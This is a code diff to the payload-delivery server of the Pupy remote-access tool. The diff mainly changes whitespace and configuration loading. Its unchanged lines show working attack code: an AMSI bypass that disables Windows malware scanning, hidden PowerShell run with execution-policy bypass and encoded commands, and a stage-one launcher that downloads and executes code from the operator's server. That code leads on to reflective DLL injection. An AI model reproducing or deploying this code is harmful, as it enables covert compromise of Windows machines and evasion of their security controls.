@@ -1,14 +1,11 @@
 #!/usr/bin/env python
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import os.path
 from pupylib.utils.term import colorize
 import random, string
 from pupygen import get_edit_pupyx86_dll
-try:
-    import ConfigParser as configparser
-except ImportError:
-    import configparser
+from pupylib.PupyConfig import PupyConfig
 from ssl import wrap_socket
 from base64 import b64encode
 import re
@@ -48,7 +45,7 @@ def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
 
 def create_ps_command(ps_command, force_ps32=False, nothidden=False):
     ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
-    try{{ 
+    try{{
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
     }}catch{{}}
     {}
@@ -56,9 +53,9 @@ def create_ps_command(ps_command, force_ps32=False, nothidden=False):
 
     if force_ps32:
         command = """$command = '{}'
-        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 
+        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
         {{
-            
+
             $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
             IEX $exec
         }}
@@ -68,7 +65,7 @@ def create_ps_command(ps_command, force_ps32=False, nothidden=False):
             $exec = [Text.Encoding]::Unicode.GetString($exec)
             IEX $exec
         }}""".format(b64encode(ps_command.encode('UTF-16LE')))
-        
+
         if nothidden is True:
             command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
         else:
@@ -91,14 +88,14 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.end_headers()
             if self.server.useTargetProxy == True:
                 print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
-                launcher = """IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');""".format(  
+                launcher = """IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');""".format(
                                                                                 server=self.server.link_ip,
                                                                                 port=self.server.link_port,
                                                                                 url_random_two=url_random_two
                                                                             )
             else:
                 print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
-                launcher = """$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString('http://{server}:{port}/{url_random_two}'));""".format(  
+                launcher = """$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString('http://{server}:{port}/{url_random_two}'));""".format(
                                                                                 server=self.server.link_ip,
                                                                                 port=self.server.link_port,
                                                                                 url_random_two=url_random_two
@@ -106,7 +103,7 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
             self.wfile.write(launcher)
             print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
-        
+
         elif self.path=="/%s" % url_random_two:
             self.send_response(200)
             self.send_header('Content-type','application/octet-stream')
@@ -131,8 +128,7 @@ class ps1_HTTPServer(HTTPServer):
         self.useTargetProxy = useTargetProxy
         HTTPServer.__init__(self, server_address, PupyPayloadHTTPHandler)
         if ssl:
-            config = configparser.ConfigParser()
-            config.read("pupy.conf")
+            config = PupyConfig()
             keyfile=config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep)
             certfile=config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep)
             self.socket = wrap_socket (self.socket, certfile=certfile, keyfile=keyfile, server_side=True)
